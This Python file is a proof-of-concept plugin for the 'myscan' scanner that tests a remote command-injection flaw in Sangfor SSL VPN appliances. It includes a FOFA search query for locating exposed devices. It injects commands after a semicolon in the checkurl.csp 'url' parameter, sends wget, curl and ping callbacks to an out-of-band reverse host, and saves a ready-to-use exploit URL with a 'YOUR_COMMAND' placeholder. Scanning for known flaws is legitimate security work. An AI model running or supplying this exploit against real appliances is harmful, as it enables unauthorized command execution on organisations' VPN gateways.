#!/usr/bin/env python3
# @Time    : 2020-04-14
# @Author  : caicai
# @File    : poc_sangfor_rce_2020.py
'''

fofa search :"CommonName: sslvpn" && "Organization: sangfor"
'''


from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sangfor rce"
        self.vulmsg = "sangfor rce . details you can google it "
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        #sangfor require https
        if self.dictdata.get("url").get("protocol","") == "http" :
            return
        self.parser=dictdata_parser(self.dictdata)
        can_check=False
        payloads=self.generatepayloads()
        for os_ver in ["win","linux"]:
            for payload in payloads[os_ver]:
                req = {
                    "url": self.url + "por/checkurl.csp?retry=1&timeout=4&url=www.baidu.com;{}".format(payload),
                    "method": "GET",
                    "headers": {
                                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"},
                    "verify": False,
                    "timeout": 10,
                }
                r = request(**req)
                if r is not None and r.status_code==200 and r.content==b"1":
                    can_check=True
        ##check
        if can_check:
            hexdatas = list(set(payloads["hexdata"]))
            res, res_data = query_reverse(hexdatas[0])
            if res:
                self.save(2,"find {} in reverse log ".format(hexdatas[0]))
                return
            for hexdata in hexdatas[1:]:  # 后面的不睡眠等待
                res, res_data = query_reverse(hexdata, False)
                if res:
                    self.save(2,"find {} in reverse log".format(hexdata))
                    return
            self.save(0,"根据特征，应该存在漏洞，但是由于不出网等原因，所以无反向请求")

    def save(self,level, others):
        self.result.append({
            "name": self.name,
            "url": self.url,
            "level": level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "others": others,
                "exploit":self.url+"por/checkurl.csp?retry=1&timeout=4&url=www.baidu.com;YOUR_COMMAND"
            }
        })
    def generatepayloads(self):
        '''
        代码有点冗杂
        '''
        payloads={
            "win":[],
            "linux":[],
            "hexdata":[]
        }
        for method in ["http","dns"]:
            cmds, hexdata = generate_reverse_payloads("sangforrce"+self.url, method)
            for cmd in cmds:
                if cmd.startswith("wget") or cmd.startswith("curl") or cmd.startswith("ping -c") :
                    payloads["linux"].append(cmd)
                else:
                    payloads["win"].append(cmd)
                payloads["hexdata"].append(hexdata)
        return payloads